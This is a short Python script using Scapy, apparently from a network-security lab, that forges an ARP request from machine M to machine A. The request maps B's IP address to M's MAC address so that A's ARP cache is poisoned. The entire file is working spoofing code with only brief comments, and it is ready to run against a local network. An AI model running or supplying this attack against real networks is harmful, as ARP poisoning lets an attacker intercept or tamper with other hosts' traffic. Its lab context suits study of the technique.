#!/usr/bin/env python3
from scapy.all import *

'''
We have 3 machines, for reference I will post their MAC Addresses here.

M-02:42:0a:09:00:69 IP: 10.9.0.105
B-02:42:0a:09:00:06 IP: 10.9.0.6 
A-02:42:0a:09:00:05 IP: 10.9.0.5 
'''

E=Ether()
## Arp sent from M to A, mapping M's MAC to B's address in A's ARP cache
A=ARP(hwsrc='02:42:0a:09:00:69', psrc ='10.9.0.6',op=1, hwdst= '02:42:0a:09:00:05', pdst='10.9.0.5' )

pkt = E/A
sendp(pkt, iface='eth0')

